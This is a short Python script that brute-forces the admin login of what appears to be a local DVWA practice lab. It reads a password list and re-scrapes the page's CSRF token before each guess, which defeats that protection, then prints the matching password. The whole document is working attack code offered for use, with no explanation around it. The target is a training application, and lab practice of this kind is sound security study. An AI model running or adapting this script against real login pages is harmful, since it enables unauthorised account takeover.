import requests
from bs4 import BeautifulSoup as Soup

def checkError(html):
    soup = Soup(html)
    error_message = 'Username and/or password incorrect.'
    search = soup.find_all(text=error_message)

    return bool(search)

filename = 'BruteForce/password-list.txt'
url = 'http://127.0.0.1/vulnerabilities/brute/index.php'
cookie = {'security': 'high', 'PHPSESSID': 'tekpsbucgt41h1ddu634mnqe76'}
session = requests.Session()
target_page = session.get(url, cookies=cookie)
page_source = target_page.text
soup = Soup(page_source)

with open(filename) as f:
    print('Running brute force attack...')
    for password in f:
        csrf_token = soup.find_all(attrs={"name": "user_token"})[0].get('value')
        payload = {'username': 'admin', 'password': password[:-1],
                   'Login': 'Login', 'user_token': csrf_token}
        response = session.get(url, cookies=cookie, params=payload)
        is_error = checkError(response.text)
        
        if is_error:
            soup = Soup(response.text)
        else:
            print('Password is: ' + password)
            break
    if is_error:
        print('Brute force failed. No matches found.')